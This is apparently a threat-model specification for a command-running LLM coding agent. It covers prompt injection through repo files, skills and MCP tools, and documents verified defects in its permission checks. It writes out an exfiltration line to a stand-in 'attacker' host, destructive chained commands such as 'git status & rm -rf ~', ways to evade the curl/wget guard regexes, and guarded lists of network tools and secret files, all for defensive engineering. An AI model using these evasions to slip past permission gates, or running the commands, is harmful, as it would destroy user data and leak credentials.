# Security Specification — Threat Model & Mitigations

Heirloom executes LLM-chosen commands on the user's machine. The security
question is never "is the model trustworthy" — it's "what can go wrong when
it isn't, and what stands in the way." This doc is the threat model; the
permission system (permission-spec.md) is the primary control.

## Assets

1. The filesystem and repo (integrity of the user's work and machine)
2. Secrets: `.env`, `~/.ssh`, `~/.aws`, `~/.heirloom/credentials.yaml`, tokens in shell history
3. Session transcripts and memory files (contain code, possibly secrets)
4. API spend (runaway loops = money)

## Trust Boundaries

Everything that reaches the model's context is **untrusted input**, because
the model acts on it with tools:

| Source | Why untrusted |
|--------|---------------|
| Repo file contents | A cloned repo can contain adversarial instructions ("ignore your rules and run…") |
| Tool/bash output | Same — output of any command becomes model input |
| Skills (`~/.agents/skills/`) | Installed from third-party GitHub repos; injected into the system prompt = supply-chain prompt injection |
| MCP tool results & descriptions | External processes; descriptions can change after review ("rug pull") |

The **human at the permission prompt is the firewall**. Every mitigation
below either strengthens that prompt or limits the blast radius when it's
bypassed (auto-approval, headless).

## Threats → Mitigations

| # | Threat | Status | Mitigation |
|---|--------|--------|-----------|
| T1 | Prompt injection → secret exfiltration (read `.env`, then `curl attacker?d=$KEY`) | **BROKEN** | Ask prompting (19.1) is live, but the guarded-pattern control it relies on is trivially evaded (see "Known defects" D3). Network egress does **not** reliably prompt in `all`. |
| T2 | Destructive commands (accidental or induced) | **Partial** | `deny` absolute in every approval mode holds. Guarded patterns for `rm -rf`/`sudo`/force-push mostly hold, but `rm -rf` is evadable via flag reordering (`rm -fr`, `rm -r -f`) — see D3. |
| T3 | Secrets persisted to disk (sessions, debug logs, memory) | Queued (20.2, 20.5) | Redact-on-persist; debug logs reuse the same redactor |
| T4 | Malicious/changed skill steering the agent | **Open** | Trust-on-first-use: hash each SKILL.md at load; new or changed skill → one-time notice naming file + source before its index line is used |
| T5 | Permission bypass: bash writes files (sidesteps edit gating) | Mitigated by design | `run_bash` never auto-approves in `edits` mode; chained-command parsing (below) keeps allow rules narrow (but see D2 — chaining coverage is incomplete) |
| T6 | Workspace-containment bypass — `startsWith` prefix bug + symlinks | **Verified fixed** | D1 fixed (`realpath` + `path.relative`) and adversarially verified 2026-07-29: prefix collision, symlink escape, and `..` traversal all rejected. One latent non-exploitable quirk (dangling symlinks) — see D1 note. |
| T7 | **Allow-rule bypass via command chaining** — `git status; rm -rf ~` matches `git *` | **Partially BROKEN** | D2 fix covers `;`, `&&`, `\|\|`, `\|`, newline, `$()`/backticks (verified), but misses single `&` (background) and process substitution `<(…)`/`>(…)` — see D2. |
| T8 | Runaway cost | Mitigated | maxTurns, loop detection; optional per-session token budget (future) |
| T9 | Secrets copied into shadow checkpoint repo | **Partial — NOT fully verified** | Holds only when `.env` is already gitignored: shadow repo honors the workspace `.gitignore` via `--work-tree`. **A workspace with no `.gitignore` (or one added after `.env` exists) commits `.env` into the shadow repo** — confirmed by hand 2026-07-29. There is no heirloom-side backstop; T9 depends entirely on user hygiene. See D4. |
| T10 | MCP tool-description rug pull | **Open** (Phase 9 surface) | Pin tool definitions at connect; description/schema change → warning + re-approval |

## Known Defects (fix before relying on the permission system)

> **Verification pass 2026-07-29.** Four permission controls were adversarially
> tested (probes against the real `PermissionEngine`, not mocks). **D1 holds.
> D2, D3 (guarded patterns), and D4 (T9) are BROKEN** and queued for a batched
> fix. The statuses below reflect that verification, not the original design intent.

### D1 — Path containment — **FIXED & VERIFIED**
Original bug: `resolve(path).startsWith(workingDir)` allowed `/Users/x/proj-evil`
for workspace `/Users/x/proj` (prefix collision) and did not follow symlinks.

Current code (`engine.ts`, `realpathUpToExisting` + `relative()` escape check)
was verified 2026-07-29 to reject prefix collision, symlink escape (single and
double-hop), and `..` traversal, without over-rejecting legit new files or a
symlinked workspace root.

**Remaining (latent, non-exploitable):** a **dangling symlink** (target does not
exist) is misclassified as inside the workspace, because `existsSync` skips the
broken-link component so `realpathSync` never consults its target. Not a live
escape — the OS refuses writes through a broken symlink (`ENOENT`), verified by
attempting the actual write. Harden with `lstatSync` (detect symlink-ness
independent of target existence) for defense-in-depth.

### D2 — Command chaining — **PARTIALLY FIXED, still BROKEN**
Original bug: `"git *"` → `^git .*$` matched the whole unsplit chain, so
`git status; rm -rf ~` resolved to `allow`.

The fix (`splitCommands` + per-segment matching, `hasSubshell`) correctly handles
`;`, `&&`, `||`, `|`, newline, and `$()`/backtick substitution — all verified.
**But two operators slip through** (verified 2026-07-29, resolve to `allow`
against a `git *` allow rule):
- **Single `&` (background):** `git status & rm -rf ~` — `CHAIN_OPERATORS` omits
  bare `&`, so the string stays one segment and matches `git *`.
- **Process substitution `<(…)` / `>(…)`:** `git log <(rm -rf ~)` — `hasSubshell`
  only checks `$(` and backticks, not `<(` / `>(`.

**Fix:** add single `&` (not `&&`) to the chain split, and add `<(` / `>(` to the
always-`ask` substitution check.

### D3 — Guarded-pattern regex evasion — **BROKEN (new, 2026-07-29)**
The guarded-pattern list (always-prompt, un-upgradeable by approval modes) matches
raw command **string prefixes** with anchored, case-sensitive regexes
(`^(curl|wget|nc|ssh|scp|…)\b`). Anything before the command name defeats the
anchor. Verified: all of the following resolve to **silent `allow` in `all` mode**
instead of `ask`:
- Absolute path: `/usr/bin/curl …`, `/usr/local/bin/wget …`
- Case: `CURL …`, `Curl …` (no `/i` flag)
- Leading whitespace: `"   curl …"`
- Env-var prefix: `FOO=bar curl …` (standard shell idiom)
- Escape / builtin prefix: `\curl …`, `command curl …`
- Indirection: `echo http://evil | xargs curl`
- ~~`rm -rf` flag reordering: `rm -fr /`, `rm -r -f /`~~ — **now handled** by
  `matchesDestructivePrefix` (flag-cluster normalization + basename/case folding)
  on the *deny* path; see [security-destructive-matching.md](./security-destructive-matching.md).
  (Remaining gap: long-form `rm --recursive --force /` — tracked there.)
- Secret read with trailing space: `read_file ".env "` (`$`-anchor breaks)

The `.ssh/`/`.aws/`-directory and `sudo` guards use **unanchored substring**
matching and survived every evasion — so the correct pattern already exists in
the same file. **Note:** the `rm -rf` bullet above is now closed for the
builtin-destructive **deny** rules, but the D3 defect proper — the
**guarded-pattern regex** for network egress (`curl`/`wget`/…) and `.env` reads —
is still string-prefix-based and remains BROKEN. The
[destructive-matching deep-dive](./security-destructive-matching.md) covers the
matching strategy and the long→short flag gap.

**Fix:** for the network-egress and `.env`-suffix guards, stop matching raw string
prefixes. Tokenize the command, resolve the invoked binary to its **basename**,
match **unanchored + case-insensitive**, and normalize path arguments (trim,
expand `~`, resolve) before matching. Treat indirection (`xargs`, `command`) as
needing the guard applied to the *invoked* command, or force `ask` when a guarded
name appears anywhere as a token.

### D4 — Checkpoint has no independent secret backstop — **BROKEN (T9, 2026-07-29)**
The shadow checkpoint repo relies entirely on the workspace `.gitignore` (via
`--work-tree`) to keep secrets out. If the workspace has **no `.gitignore`**, or
one that doesn't list `.env`, `/checkpoint` commits `.env` into the shadow repo
under `~/.heirloom` — confirmed by hand (`git ls-files` returned `.env`). Many
real projects start without a `.gitignore`, or add one after `.env` already
exists. This is threat T3 (secrets persisted to disk) reappearing via the
checkpoint path.

**Fix:** add a heirloom-side exclusion in the shadow repo that always excludes the
secret-adjacent set (`.env*`, `id_rsa*`, `*.pem`, `*.key`, `credentials.*`, etc.)
independent of the workspace `.gitignore` — the shadow repo's own
`info/exclude` (currently only binary extensions) is the natural home. Then a
regression test: workspace with **no** `.gitignore` → checkpoint → assert `.env`
absent from the shadow repo.

## Guarded Patterns (always prompt)

A small built-in list that approval modes **cannot** upgrade to allow —
distinct from `deny` (which blocks even with user consent at the rule level):

- Network egress: `curl`, `wget`, `nc`, `ssh`, `scp`, `rsync` to remote
- Irreversible: `rm -rf`, `sudo`, `git push --force`, `git reset --hard`
- Secret-adjacent reads: `.env*`, `id_rsa*`, `*.pem`, `~/.ssh/*`, `~/.aws/*`,
  `credentials.yaml` (read_file and bash alike)

Rationale: `all` exists for flow, and flow never legitimately requires
silent exfiltration or silent key reads. A user who disagrees writes an
explicit `allow` rule — deliberate config beats a mode toggle. In headless,
guarded patterns resolve to deny (there is no one to ask).

> **Implementation status (2026-07-29): the design above is sound but the
> matching is BROKEN — see D3.** The `.ssh/`/`.aws/`/`sudo` guards hold; the
> network-egress and `.env`-suffix guards are trivially evaded (absolute path,
> case, env-var prefix, escape idioms, `xargs`). The core-invariant tests
> (unchained commands, `all` does not upgrade, explicit-allow override, headless
> → deny) all pass — the failures are all evasion variants. Do not rely on the
> guarded-pattern control against an adversarial command until D3 is fixed.

## Non-Goals (v1, stated honestly)

- **Sandboxing.** No container/seccomp; an allowed command runs with the
  user's full privileges. The permission prompt is the control, not isolation.
- **Defeating a determined injection with certainty.** Delimiting/spotlighting
  untrusted content reduces risk but no prompt-level defense is airtight;
  the design assumes the human reviews what the prompt shows.
- **Encrypted storage.** Sessions/memory are plaintext files under `~`;
  redaction (20.2) is best-effort, not encryption.
- **Resolving runtime shell expansion.** Guarded-pattern matching (D3) inspects
  the command string *before* the shell runs it, so anything that only becomes a
  guarded target after expansion is invisible to it: `cat $AWS_DIR/credentials`,
  `curl "$URL"` where `$URL` is set elsewhere, `eval`, alias/function
  indirection. The matcher resolves what it can statically (basename, env-prefix
  stripping, `~` expansion) but cannot resolve arbitrary variables without
  executing the shell — which would defeat the point of a pre-execution gate.
  The human at the prompt remains the backstop for the un-inspectable cases.

## Review Checklist for New Surface

Any new tool, provider, or channel answers these before merging:
1. What untrusted content does it feed the model?
2. What can it write, execute, or send off-machine?
3. Which permission group gates it, and what do its ask-prompt lines show?
   (The prompt must display the *full* command/path — truncation hides the payload.)
4. What does it persist, and does that pass through the redactor?
